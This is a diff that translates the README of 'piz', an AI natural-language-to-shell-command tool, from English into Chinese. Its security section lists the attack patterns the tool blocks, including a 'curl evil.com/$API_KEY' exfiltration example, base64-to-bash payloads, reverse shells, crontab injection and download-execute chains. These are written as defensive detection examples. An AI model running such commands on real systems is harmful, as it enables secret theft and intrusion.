@@ -1,8 +1,8 @@
 <h1 align="center">piz</h1>
 
 <p align="center">
-  <strong>Intelligent terminal command assistant</strong><br>
-  Translate natural language to shell commands with AI
+  <strong>智能终端命令助手</strong><br>
+  用自然语言描述，自动生成 Shell 命令
 </p>
 
 <p align="center">
@@ -12,8 +12,8 @@
 </p>
 
 <p align="center">
-  <a href="./README.md">English</a> |
-  <a href="./README_ZH.md">简体中文</a>
+  <a href="./README_EN.md">English</a> |
+  <a href="./README.md">简体中文</a>
 </p>
 
 ---
@@ -22,184 +22,186 @@
   <img src="assets/demo.gif" alt="piz demo" width="800">
 </p>
 
-## What is piz?
+## piz 是什么？
 
-**piz** solves one problem: you know *what* you want to do, but not the exact command. Describe it in plain language, and piz translates it into the right shell command for your OS and shell.
+**piz** 解决一个问题：你知道想做什么，但记不住具体命令。用自然语言描述你的需求，piz 自动翻译成适合当前系统和 Shell 的命令。
 
 ```
-$ piz list all files larger than 100MB
-  ➜ find . -size +100M -type f
-  [Y] Execute  [n] Cancel  [e] Edit
+$ piz 查看磁盘使用情况
+  ➜ df -h
+  [Y] 执行  [n] 取消  [e] 编辑
 ```
 
-## Features
+## 核心功能
 
-- **Natural Language to Command** - Describe what you want, get the exact command
-- **Multi-Backend LLM** - OpenAI, Claude, Gemini, Ollama + 12 OpenAI-compatible providers (DeepSeek, SiliconFlow, OpenRouter, Moonshot, Zhipu/GLM, Qianfan, DashScope, Mistral, Together, Minimax, BytePlus, and more)
-- **Security Hardening** - Three-layer protection: prompt-level refusal for non-command input, injection detection (base64 payloads, env exfiltration, reverse shells, curl config attacks), and regex-based danger classification
-- **Danger Detection** - Dual-layer: regex patterns + LLM classification. Dangerous commands always require explicit confirmation
-- **Command Explain** - Break down any command into its components with `piz -e`
-- **Command Fix** - Auto-diagnose and fix failed commands with `piz fix`, with auto-retry (up to 3 attempts)
-- **Interactive Chat** - Multi-turn chat mode with context (`piz chat`), with `/help`, `/clear`, `/history` commands and persistent history
-- **Multi-Candidate** - Generate multiple command options with `-n` and pick your preferred one
-- **Local Cache** - SQLite cache with TTL + LRU eviction, max entries limit, repeated queries return instantly
-- **Execution History** - Track all executed commands with `piz history`, searchable
-- **Shell Integration** - `piz init <shell>` generates shell wrapper functions so `cd`/`export`/`source` work correctly in the current shell (bash, zsh, fish, PowerShell), with built-in aliases (`p`, `pf`, `pc`)
-- **Eval Mode** - `--eval` outputs confirmed command for shell wrapper to eval, used by shell integration
-- **Shell Completions** - Generate completions for bash, zsh, fish, and PowerShell
-- **Pipe Mode** - Script-friendly output with `--pipe` for integration with other tools
-- **Multi-Language UI** - Chinese, English interface with localized security messages
-- **Cross-Platform** - Windows (PowerShell/cmd), macOS, Linux (bash/zsh/fish) with non-invasive encoding (no `chcp`/`OutputEncoding` modification)
-- **Interactive Setup** - First-run wizard with provider presets, no manual config editing needed
-- **NO_COLOR Support** - Respects the `NO_COLOR` environment variable
-- **API Resilience** - Automatic retry with exponential backoff for 429/5xx errors
+- **自然语言转命令** — 描述需求，得到精确命令
+- **多 LLM 后端** — 支持 OpenAI、Claude、Gemini、Ollama + 12 个 OpenAI 兼容供应商（DeepSeek、硅基流动、OpenRouter、Moonshot、智谱GLM、百度千帆、阿里DashScope、Mistral、Together、Minimax、字节BytePlus 等）
+- **安全加固** — 三层防护：Prompt 层拒绝非命令输入、注入检测（base64 载荷、环境变量泄露、反弹 Shell、curl 配置攻击）、正则危险分级
+- **危险命令检测** — 正则 + LLM 双重防护，危险命令强制二次确认，无法跳过
+- **命令解释** — `piz -e 'command'` 逐项拆解命令含义
+- **命令纠错** — `piz fix` 自动诊断并修复失败命令，支持自动重试（最多 3 次）
+- **交互式对话** — `piz chat` 多轮对话模式，支持 `/help`、`/clear`、`/history` 命令和历史持久化
+- **多候选命令** — `-n` 参数生成多个命令方案，自主选择最优方案
+- **本地缓存** — SQLite 缓存 + TTL 过期 + LRU 淘汰 + 最大条目数限制，重复查询秒返回
+- **执行历史** — `piz history` 查看和搜索所有执行过的命令
+- **Shell 集成** — `piz init <shell>` 生成 Shell 包装函数，使 `cd`/`export`/`source` 在当前 Shell 中正确生效（bash、zsh、fish、PowerShell），内置便捷别名（`p`、`pf`、`pc`）
+- **Eval 模式** — `--eval` 将确认后的命令输出给 Shell 包装函数执行
+- **Shell 补全** — 支持 bash、zsh、fish、PowerShell 自动补全
+- **管道模式** — `--pipe` 纯命令输出，便于脚本集成
+- **多语言界面** — 中文、英文，安全提示信息全面国际化
+- **跨平台** — Windows (PowerShell/cmd)、macOS、Linux (bash/zsh/fish)，零侵入编码处理（不修改 `chcp`/`OutputEncoding`）
+- **交互式配置** — 首次运行自动引导，内置供应商预设，无需手动编辑配置
+- **NO_COLOR 支持** — 尊重 `NO_COLOR` 环境变量
+- **API 容错** — 429/5xx 错误自动重试 + 指数退避
 
-## Quick Start
+## 快速开始
 
-### Install
+### 安装
 
-**Homebrew (macOS / Linux):**
+**Homebrew（macOS / Linux）：**
 
 ```bash
 brew install AriesOxO/tap/piz
 ```
 
-**macOS / Linux (one-liner):**
+**macOS / Linux（一键安装）：**
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/AriesOxO/piz/main/install.sh | bash
 ```
 
-**Windows (PowerShell):**
+**Windows（PowerShell）：**
 
 ```powershell
 iwr -useb https://raw.githubusercontent.com/AriesOxO/piz/main/install.ps1 | iex
 ```
 
-**Cargo (any platform):**
+**Cargo（全平台）：**
 
 ```bash
 cargo install piz
 ```
 
-**Manual download:**
+**手动下载：**
 
-Download binaries or `.msi` (Windows) from [Releases](https://github.com/AriesOxO/piz/releases). Linux binaries are statically linked (musl), compatible with any Linux distribution.
+前往 [Releases](https://github.com/AriesOxO/piz/releases) 下载二进制文件、`.msi`（Windows）或 `.deb`（Debian/Ubuntu）。
 
-| Platform | Downloads |
-|----------|-----------|
+| 平台 | 下载格式 |
+|------|---------|
 | Windows x86_64 | `.msi` `.zip` |
 | macOS x86_64 | `.tar.gz` |
 | macOS ARM64 (Apple Silicon) | `.tar.gz` |
-| Linux x86_64 (static musl) | `.tar.gz` |
-| Linux ARM64 (static musl) | `.tar.gz` |
+| Linux x86_64 | `.tar.gz` `.deb` |
+| Linux ARM64 | `.tar.gz` |
 
-### Setup
+### 配置
 
-Run any command and the interactive setup wizard will start automatically:
+首次运行任何命令，会自动进入交互式配置向导：
 
 ```
-$ piz list files
-No configuration found. Let's set up piz for the first time.
+$ piz 列出文件
 
-  ⚙ piz configuration wizard
+  ⚙ piz 配置向导
 
-? Select language: 中文 / English
-? Select default LLM backend:
+? 选择语言 / Select language：中文
+? 选择默认 LLM 后端：
   > openai (DeepSeek, SiliconFlow, OpenRouter, ...)
     claude
     gemini (Google)
-    ollama (local)
-? Select API provider:
-    OpenAI / DeepSeek / SiliconFlow / OpenRouter / Moonshot
-    Zhipu-GLM / Qianfan / DashScope / Mistral / Together
-    Minimax / BytePlus / Custom URL
-? API base URL: https://api.siliconflow.cn
-? API key: sk-xxxxx
-? Model name: Qwen/Qwen3-8B
-? Auto-execute safe commands without confirmation? Yes
+    ollama (本地)
+? 选择 API 供应商：
+    OpenAI / DeepSeek / 硅基流动 / OpenRouter / Moonshot
+    智谱GLM / 百度千帆 / 阿里DashScope / Mistral / Together
+    Minimax / 字节BytePlus / 自定义URL
+? API 地址：https://api.siliconflow.cn
+? API 密钥：sk-xxxxx
+? 模型名称：Qwen/Qwen3-8B
+? 安全命令是否自动执行（不弹出确认）？是
 
-  ✔ Config saved
+  ✔ 配置已保存
 ```
 
-Or manually: `piz config --init`
+也可以手动运行：`piz config --init`
 
-## Usage
+## 使用示例
 
-### Translate natural language
+### 自然语言转命令
 
 ```bash
-piz show disk usage                    # → df -h
-piz find all rust files modified today # → find . -name "*.rs" -mtime 0
-piz compress the src folder            # → tar -czf src.tar.gz src/
+piz 查看磁盘使用情况              # → df -h
+piz 找出所有大于100M的文件        # → find . -size +100M -type f
+piz 压缩src目录                   # → tar -czf src.tar.gz src/
+piz 查看3000端口被谁占用          # → lsof -i :3000
+piz 统计当前目录代码行数          # → find . -name "*.rs" | xargs wc -l
 ```
 
-### Multi-candidate mode
+### 多候选模式
 
 ```bash
-$ piz -n 3 find large files
-? Select a command to execute:
-> 1. find . -size +100M -type f — Find files larger than 100MB
-  2. du -ah . | sort -rh | head -20 — Show top 20 largest files/dirs
-  3. ls -lhRS | head -30 — List files sorted by size descending
+$ piz -n 3 查找大文件
+? 选择要执行的命令:
+> 1. find . -size +100M -type f — 查找大于 100MB 的文件
+  2. du -ah . | sort -rh | head -20 — 显示最大的 20 个文件/目录
+  3. ls -lhRS | head -30 — 按大小降序列出文件
 ```
 
-### Explain a command
+### 命令解释
 
 ```bash
-$ piz -e 'tar -czf archive.tar.gz src/'
-📖 Command explanation:
+$ piz -e 'awk "{print \$2}" access.log | sort | uniq -c | sort -rn | head -10'
+📖 命令解释：
 
-  tar  — tape archive tool
-  -c   — create a new archive
-  -z   — compress with gzip
-  -f   — specify output filename
-  src/ — directory to archive
+  awk "{print $2}"  — 提取每行第2个字段（通常是URL或IP）
+  access.log        — 输入文件
+  sort              — 排序（为 uniq 做准备）
+  uniq -c           — 去重并统计出现次数
+  sort -rn          — 按数字降序排列
+  head -10          — 取前10条结果
 ```
 
-### Fix failed commands
+### 命令纠错
 
 ```bash
 $ npm install
 → EACCES: permission denied...
 
 $ piz fix
-🔧 Diagnosis: Permission denied writing to global node_modules
+🔧 诊断：权限不足，无法写入 node_modules
   - npm install
   + sudo npm install
 ```
 
-The fix command now supports auto-retry: if the fixed command also fails, piz will attempt up to 3 rounds of diagnosis and repair.
+修复命令支持自动重试：如果修复后的命令仍然失败，piz 会继续分析错误并尝试修复，最多 3 轮。
 
-### Interactive chat mode
+### 交互式对话模式
 
 ```bash
 $ piz chat
-💬 interactive mode
-Type your request, or 'exit'/'quit' to leave.
+💬 交互模式
+输入你的请求，或 'exit'/'quit' 退出。
 
-> list all running docker containers
+> 列出所有运行中的 docker 容器
   ➜ docker ps
-  [Y] Execute  [n] Cancel  [e] Edit
+  [Y] 执行  [n] 取消  [e] 编辑
 
-> only show the names
+> 只显示名称
   ➜ docker ps --format '{{.Names}}'
 ```
 
-Chat mode supports special commands:
-- `/help` — Show available commands
-- `/clear` — Clear conversation history
-- `/history` — View conversation history
-- `/detail` — Toggle inline command explanation on/off
+对话模式支持特殊命令：
+- `/help` — 显示可用命令
+- `/clear` — 清除对话历史
+- `/history` — 查看对话历史
+- `/detail` — 切换内联命令解释开关
 
-### Execution history
+### 执行历史
 
 ```bash
-$ piz history              # Show last 20 executed commands
-$ piz history docker -l 10 # Search for "docker" in last 10 entries
+$ piz history                # 查看最近 20 条执行记录
+$ piz history docker -l 10   # 搜索含 "docker" 的最近 10 条记录
 ```
 
-### Shell completions
+### Shell 补全
 
 ```bash
 piz completions bash > ~/.bash_completion.d/piz   # Bash
@@ -208,107 +210,107 @@ piz completions fish > ~/.config/fish/completions/piz.fish  # Fish
 piz completions powershell > piz.ps1               # PowerShell
 ```
 
-### Shell integration
+### Shell 集成
 
-Shell integration enables commands like `cd`, `export`, and `source` to work correctly in your current shell session. Run `piz init <shell>` and add the output to your shell profile:
+Shell 集成可以让 `cd`、`export`、`source` 等命令在当前 Shell 会话中正确生效。运行 `piz init <shell>` 并将输出添加到你的 Shell 配置文件中：
 
-**Bash / Zsh:**
+**Bash / Zsh：**
 
 ```bash
-# Add to ~/.bashrc or ~/.zshrc:
-eval "$(piz init bash)"   # or: eval "$(piz init zsh)"
+# 添加到 ~/.bashrc 或 ~/.zshrc：
+eval "$(piz init bash)"   # 或：eval "$(piz init zsh)"
 ```
 
-**Fish:**
+**Fish：**
 
 ```fish
-# Add to ~/.config/fish/config.fish:
+# 添加到 ~/.config/fish/config.fish：
 piz init fish | source
 ```
 
-**PowerShell:**
+**PowerShell：**
 
 ```powershell
-# Add to $PROFILE:
+# 添加到 $PROFILE：
 piz init powershell | Out-String | Invoke-Expression
 ```
 
-Once set up, piz will use `--eval` mode automatically, and commands like `cd`, `export`, `source` will take effect in your current shell.
+配置完成后，piz 会自动使用 `--eval` 模式，`cd`、`export`、`source` 等命令将在当前 Shell 中正确生效。
 
-Shell integration also provides built-in aliases for convenience:
+Shell 集成还提供了内置便捷别名：
 
-| Alias | Command | Description |
-|-------|---------|-------------|
-| `p` | `piz` | Short alias for piz |
-| `pf` | `piz fix` | Quick fix last failed command |
-| `pc` | `piz chat` | Quick enter chat mode |
-
-```bash
-p list all rust files        # Same as: piz list all rust files
-pf                           # Same as: piz fix
-pc                           # Same as: piz chat
-```
-
-### Pipe mode
+| 别名 | 命令 | 说明 |
+|------|------|------|
+| `p` | `piz` | piz 短别名 |
+| `pf` | `piz fix` | 快速修复上一条失败命令 |
+| `pc` | `piz chat` | 快速进入对话模式 |
 
 ```bash
-# Output only the command, no UI — useful for scripting
-piz --pipe list all rust files   # → find . -name "*.rs"
-eval $(echo "list files" | piz --pipe)  # Execute directly
+p 列出所有 rust 文件        # 等同于：piz 列出所有 rust 文件
+pf                          # 等同于：piz fix
+pc                          # 等同于：piz chat
 ```
 
-### Configuration management
+### 管道模式
 
 ```bash
-piz config --init        # Run setup wizard
-piz config --show        # Show current config (API keys masked)
-piz config --reset       # Delete config and start over
+# 仅输出命令，无 UI —— 适合脚本集成
+piz --pipe 查看所有 rust 文件   # → find . -name "*.rs"
+eval $(echo "列出文件" | piz --pipe)  # 直接执行
 ```
 
-### Other options
+### 配置管理
 
 ```bash
-piz --backend ollama list files    # Use specific backend
-piz --backend gemini show memory   # Use Google Gemini
-piz --no-cache show memory         # Skip cache
-piz --verbose list files           # Debug: show prompts and LLM responses
-piz -n 3 list files                # Generate 3 candidate commands
-piz clear-cache                    # Clear all cached commands
-piz --eval list files                 # Eval mode (for shell integration)
-piz --version                      # Show version
+piz config --init        # 运行配置向导
+piz config --show        # 查看当前配置（API 密钥自动脱敏）
+piz config --reset       # 删除配置文件，重新开始
 ```
 
-## Update
-
-### Self-update
+### 其他用法
 
 ```bash
-piz update                  # Interactive: check latest version and upgrade
+piz --backend ollama 查看内存     # 临时切换后端
+piz --backend gemini 查看CPU      # 使用 Google Gemini
+piz --no-cache 查看系统信息       # 跳过缓存
+piz --verbose 列出文件            # 调试：显示 Prompt 和 LLM 响应
+piz -n 3 列出文件                 # 生成 3 个候选命令
+piz clear-cache                   # 清空缓存
+piz --eval 列出文件               # Eval 模式（用于 Shell 集成）
+piz --version                     # 查看版本
 ```
 
-`piz update` checks GitHub Releases for the latest version. If a new version is available, you can choose between two upgrade methods:
+## 更新
 
-1. **Overwrite install** — replace the current binary in-place
-2. **Uninstall then reinstall** — remove old version first, then install new
+### 自更新
 
-Both methods include automatic rollback on failure.
+```bash
+piz update                  # 交互式：检查最新版本并升级
+```
 
-### Automatic update check
+`piz update` 检查 GitHub Releases 获取最新版本。如果有新版本，可选择两种升级方式：
 
-piz checks for updates **automatically in the background** after each run (at most once every 24 hours, with a 5-second timeout so it never blocks). When a newer version is detected, a hint is shown:
+1. **覆盖安装** — 直接替换当前二进制文件
+2. **卸载后重装** — 先删除旧版本，再安装新版本
+
+两种方式均支持失败自动回滚。
+
+### 自动更新检查
+
+piz 在每次运行后**自动在后台检查更新**（每 24 小时最多一次，5 秒超时，绝不会阻塞）。检测到新版本时会显示提示：
 
 ```
 ℹ piz 0.3.0 is available (current: 0.2.5). Run `piz update` to upgrade.
 ```
 
-No manual configuration is needed — this works out of the box. The check state is stored in `~/.piz/update_state.json`.
+无需任何配置即可使用。检查状态存储在 `~/.piz/update_state.json`。
 
-### Manual install (specific version)
+### 手动安装（指定版本）
 
-If you want to install a specific version, download the binary directly from [GitHub Releases](https://github.com/AriesOxO/piz/releases):
+如需安装特定版本，可直接从 [GitHub Releases](https://github.com/AriesOxO/piz/releases) 下载：
 
 ```bash
-# Linux/macOS — replace VERSION and TARGET as needed
+# Linux/macOS — 替换 VERSION 和 TARGET
 curl -fsSL https://github.com/AriesOxO/piz/releases/download/vVERSION/piz-TARGET.tar.gz | tar xz
 sudo mv piz /usr/local/bin/
 
@@ -318,7 +320,7 @@ Expand-Archive piz.zip -DestinationPath .
 Move-Item piz.exe "$env:LOCALAPPDATA\piz\piz.exe"
 ```
 
-Or reinstall via the install script:
+或通过安装脚本重新安装：
 
 ```bash
 # Linux/macOS
@@ -328,50 +330,50 @@ curl -fsSL https://raw.githubusercontent.com/AriesOxO/piz/main/install.sh | bash
 irm https://raw.githubusercontent.com/AriesOxO/piz/main/install.ps1 | iex
 ```
 
-## Supported Providers
+## 支持的供应商
 
-### Native backends
+### 原生后端
 
-| Backend | Config section | Notes |
-|---------|---------------|-------|
-| **OpenAI** | `[openai]` | Also supports any OpenAI-compatible API via `base_url` |
-| **Claude** | `[claude]` | Anthropic Messages API, custom `base_url` supported |
-| **Gemini** | `[gemini]` | Google Generative AI native API |
-| **Ollama** | `[ollama]` | Local models, no API key needed |
+| 后端 | 配置段 | 说明 |
+|------|--------|------|
+| **OpenAI** | `[openai]` | 同时支持任何 OpenAI 兼容 API（通过 `base_url`） |
+| **Claude** | `[claude]` | Anthropic Messages API，支持自定义 `base_url` |
+| **Gemini** | `[gemini]` | Google Generative AI 原生 API |
+| **Ollama** | `[ollama]` | 本地模型，无需 API key |
 
-### OpenAI-compatible providers (via `[openai]` with custom `base_url`)
+### OpenAI 兼容供应商（通过 `[openai]` + 自定义 `base_url`）
 
 <details>
-<summary>Click to expand all 12 providers</summary>
+<summary>点击展开全部 12 个供应商</summary>
 
-| Provider | base_url | Default model |
-|----------|----------|---------------|
+| 供应商 | base_url | 默认模型 |
+|--------|----------|---------|
 | OpenAI | `https://api.openai.com` | gpt-4o-mini |
 | DeepSeek | `https://api.deepseek.com` | deepseek-chat |
-| SiliconFlow | `https://api.siliconflow.cn` | Qwen/Qwen3-8B |
+| 硅基流动 | `https://api.siliconflow.cn` | Qwen/Qwen3-8B |
 | OpenRouter | `https://openrouter.ai/api/v1` | auto |
 | Moonshot/Kimi | `https://api.moonshot.cn` | moonshot-v1-8k |
-| Zhipu/GLM | `https://open.bigmodel.cn/api/paas/v4` | glm-4-flash |
-| Qianfan/Baidu | `https://qianfan.baidubce.com/v2` | deepseek-v3 |
-| DashScope/Alibaba | `https://dashscope.aliyuncs.com/compatible-mode/v1` | qwen-plus |
+| 智谱/GLM | `https://open.bigmodel.cn/api/paas/v4` | glm-4-flash |
+| 百度千帆 | `https://qianfan.baidubce.com/v2` | deepseek-v3 |
+| 阿里DashScope | `https://dashscope.aliyuncs.com/compatible-mode/v1` | qwen-plus |
 | Mistral | `https://api.mistral.ai/v1` | mistral-small-latest |
 | Together | `https://api.together.xyz/v1` | Meta-Llama-3-8B |
 | Minimax | `https://api.minimax.io/v1` | MiniMax-M1 |
-| BytePlus | `https://api.byteplus.volcengineapi.com/v1` | doubao-1.5-pro-32k |
+| 字节BytePlus | `https://api.byteplus.volcengineapi.com/v1` | doubao-1.5-pro-32k |
 
 </details>
 
-## Configuration
+## 配置文件
 
-Config file: `~/.piz/config.toml`
+路径：`~/.piz/config.toml`
 
 ```toml
 default_backend = "openai"
-cache_ttl_hours = 168          # Cache TTL (7 days)
-cache_max_entries = 1000       # Maximum cache entries (LRU eviction)
-auto_confirm_safe = true       # Auto-execute safe commands
-language = "zh"                # UI language: zh / en
-chat_history_size = 20         # Max chat history messages
+cache_ttl_hours = 168          # 缓存有效期（7天）
+cache_max_entries = 1000       # 最大缓存条目数（LRU 淘汰）
+auto_confirm_safe = true       # 安全命令自动执行
+language = "zh"                # 界面语言：zh / en
+chat_history_size = 20         # 对话历史最大消息数
 
 [openai]
 api_key = "sk-your-key"
@@ -391,7 +393,7 @@ model = "gpt-4o-mini"
 # model = "llama3"
 ```
 
-### Provider config examples
+### 常见供应商配置
 
 <details>
 <summary>DeepSeek</summary>
@@ -405,7 +407,7 @@ base_url = "https://api.deepseek.com"
 </details>
 
 <details>
-<summary>SiliconFlow</summary>
+<summary>硅基流动 (SiliconFlow)</summary>
 
 ```toml
 [openai]
@@ -437,7 +439,7 @@ base_url = "https://openrouter.ai/api/v1"
 </details>
 
 <details>
-<summary>Moonshot / Kimi</summary>
+<summary>Moonshot / 月之暗面</summary>
 
 ```toml
 [openai]
@@ -448,7 +450,7 @@ base_url = "https://api.moonshot.cn"
 </details>
 
 <details>
-<summary>Zhipu / GLM</summary>
+<summary>智谱 / GLM</summary>
 
 ```toml
 [openai]
@@ -458,97 +460,97 @@ base_url = "https://open.bigmodel.cn/api/paas/v4"
 ```
 </details>
 
-## Security
+## 安全机制
 
-piz implements three layers of security:
+piz 实现了三层安全防护：
 
-### 1. Prompt-level refusal
-Non-command inputs (greetings, chitchat, prompt injection attempts) are rejected by the LLM with a clear message instead of generating a command.
+### 1. Prompt 层拒绝
+非命令输入（问候、闲聊、Prompt 注入尝试）会被 LLM 拒绝并返回说明，不会生成可执行命令。
 
-### 2. Injection detection (local, no LLM)
-Commands are scanned for malicious patterns before execution:
-- Environment variable exfiltration (`curl evil.com/$API_KEY`)
-- Encoded payloads (`echo ... | base64 -d | bash`)
-- Reverse shells (`python -e 'import socket...'`)
-- Shell config overwrites (`> ~/.bashrc`)
-- Silent crontab injection (`| crontab -`)
-- curl config file attacks (`curl -K malicious.conf`)
-- Download-execute chains (`wget ... && chmod +x && ./`)
-- Dangerous find/xargs patterns (`find -delete`, `xargs rm`)
+### 2. 注入检测（本地正则，无需 LLM）
+命令在执行前会被扫描以下恶意模式：
+- 环境变量泄露（`curl evil.com/$API_KEY`）
+- 编码载荷（`echo ... | base64 -d | bash`）
+- 反弹 Shell（`python -e 'import socket...'`）
+- Shell 配置覆写（`> ~/.bashrc`）
+- 静默 Crontab 注入（`| crontab -`）
+- curl 配置文件攻击（`curl -K malicious.conf`）
+- 下载-执行链（`wget ... && chmod +x && ./`）
+- 危险的 find/xargs 模式（`find -delete`、`xargs rm`）
 
-Matched commands are **blocked** and cannot be executed. Injection messages are localized (zh/en).
+命中以上模式的命令会被**直接拦截**，无法执行。注入提示信息已全面国际化（中/英）。
 
-Cached commands are also re-validated on retrieval — poisoned cache entries are automatically purged.
+缓存命中时也会重新验证注入检测 —— 中毒的缓存条目会被自动清除。
 
-### 3. Danger classification
+### 3. 危险分级
 
-| Level | Behavior | Example |
-|-------|----------|---------|
-| **Safe** | Auto-execute (if configured) | `ls`, `df -h`, `git status` |
-| **Warning** | Prompt for confirmation | `sudo apt install`, `chmod 755`, `git push` |
-| **Dangerous** | Red warning + explicit confirmation (cannot skip) | `rm -rf /`, `mkfs`, `DROP TABLE` |
+| 级别 | 行为 | 示例 |
+|------|------|------|
+| **安全** | 自动执行（如已配置） | `ls`、`df -h`、`git status` |
+| **警告** | 弹出确认 | `sudo apt install`、`chmod 755`、`git push` |
+| **危险** | 红色警告 + 强制二次确认（无法跳过） | `rm -rf /`、`mkfs`、`DROP TABLE` |
 
-## Architecture
+## 项目结构
 
 ```
 piz/
 ├── src/
-│   ├── main.rs          # Entry point, CLI dispatch, response parsing, multi-candidate selection
-│   ├── cli.rs           # clap argument definitions (with clap_complete)
-│   ├── config.rs        # TOML config + interactive setup wizard (12 provider presets)
-│   ├── context.rs       # System context collection (OS, shell, cwd, arch, git, package manager)
-│   ├── i18n.rs          # Multi-language translations (zh/en) including injection messages
+│   ├── main.rs          # 入口，CLI 分发，响应解析，多候选选择
+│   ├── cli.rs           # clap 命令行参数定义（含 clap_complete）
+│   ├── config.rs        # TOML 配置 + 交互式配置向导（12 个供应商预设）
+│   ├── context.rs       # 系统上下文收集（OS、Shell、CWD、架构、Git、包管理器）
+│   ├── i18n.rs          # 多语言翻译（中/英），含注入检测消息国际化
 │   ├── llm/
-│   │   ├── mod.rs       # LlmBackend trait + factory + retry/backoff utilities
-│   │   ├── prompt.rs    # Prompt templates with security rules, few-shot examples, multi-candidate
-│   │   ├── openai.rs    # OpenAI-compatible adapter (with retry)
-│   │   ├── claude.rs    # Claude adapter (with retry)
-│   │   ├── gemini.rs    # Google Gemini adapter (with retry)
-│   │   └── ollama.rs    # Ollama adapter (with retry)
-│   ├── cache.rs         # SQLite cache with SHA256 keys, TTL, LRU eviction + execution history
-│   ├── danger.rs        # Regex danger detection + injection scanner (InjectionReason enum)
-│   ├── executor.rs      # User confirmation + command execution
-│   ├── explain.rs       # Command explain mode
-│   ├── fix.rs           # Command fix mode + auto-fix retry loop
-│   ├── chat.rs          # Interactive chat mode with slash commands + persistent history
-│   ├── history.rs       # Shell history reader
-│   ├── shell_init.rs    # Shell integration code generation (bash/zsh/fish/PowerShell) + built-in aliases
-│   └── ui.rs            # Terminal output formatting (spinner, diff, colors)
+│   │   ├── mod.rs       # LlmBackend trait + 工厂函数 + 重试/退避工具
+│   │   ├── prompt.rs    # Prompt 模板（含安全规则、few-shot 示例、多候选支持）
+│   │   ├── openai.rs    # OpenAI 兼容适配器（含重试）
+│   │   ├── claude.rs    # Claude 适配器（含重试）
+│   │   ├── gemini.rs    # Google Gemini 适配器（含重试）
+│   │   └── ollama.rs    # Ollama 适配器（含重试）
+│   ├── cache.rs         # SQLite 缓存（SHA256 key + TTL + LRU 淘汰）+ 执行历史
+│   ├── danger.rs        # 正则危险检测 + 注入扫描（InjectionReason 枚举）
+│   ├── executor.rs      # 用户确认交互 + 命令执行
+│   ├── explain.rs       # 命令解释模式
+│   ├── fix.rs           # 命令纠错模式 + 自动修复重试循环
+│   ├── chat.rs          # 交互式对话模式（斜杠命令 + 历史持久化）
+│   ├── history.rs       # Shell 历史记录读取
+│   ├── shell_init.rs    # Shell 集成代码生成（bash/zsh/fish/PowerShell）+ 内置别名
+│   └── ui.rs            # 终端输出格式化（Spinner、Diff、着色）
 ├── tests/
-│   ├── integration.rs   # Integration tests
-│   ├── llm_e2e.rs       # LLM end-to-end tests (require API key, ignored by default)
-│   └── windows_shells.rs # Cross-shell tests (cmd/PowerShell/bash)
+│   ├── integration.rs   # 集成测试
+│   ├── llm_e2e.rs       # LLM 端到端测试（需要 API key，默认跳过）
+│   └── windows_shells.rs # 跨 Shell 测试（cmd/PowerShell/bash）
 ├── homebrew/
-│   └── piz.rb           # Homebrew formula template (auto-rendered by release workflow)
-├── install.sh           # macOS/Linux installer
-└── install.ps1          # Windows installer
+│   └── piz.rb           # Homebrew formula 模板（发版时自动渲染）
+├── install.sh           # macOS/Linux 安装脚本
+└── install.ps1          # Windows 安装脚本
 ```
 
-## Building from Source
+## 构建
 
 ```bash
-# Prerequisites: Rust 1.70+
+# 前提：Rust 1.70+
 git clone https://github.com/AriesOxO/piz.git
 cd piz
 
-cargo build --release      # Build
-cargo test                 # Run tests (437)
-cargo install --path .     # Install to PATH
+cargo build --release      # 构建
+cargo test                 # 运行测试（437 个）
+cargo install --path .     # 安装到 PATH
 ```
 
-## Environment Variables
+## 环境变量
 
-| Variable | Description |
-|----------|-------------|
-| `NO_COLOR` | Set to any value to disable colored output |
+| 变量 | 说明 |
+|------|------|
+| `NO_COLOR` | 设置为任意值可禁用彩色输出 |
 
-## Contributing
+## 参与贡献
 
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+欢迎贡献！请阅读 [CONTRIBUTING.md](CONTRIBUTING.md) 了解贡献指南。
 
-## License
+## 许可证
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+本项目基于 MIT 许可证开源，详见 [LICENSE](LICENSE)。
 
 ## Star History
 
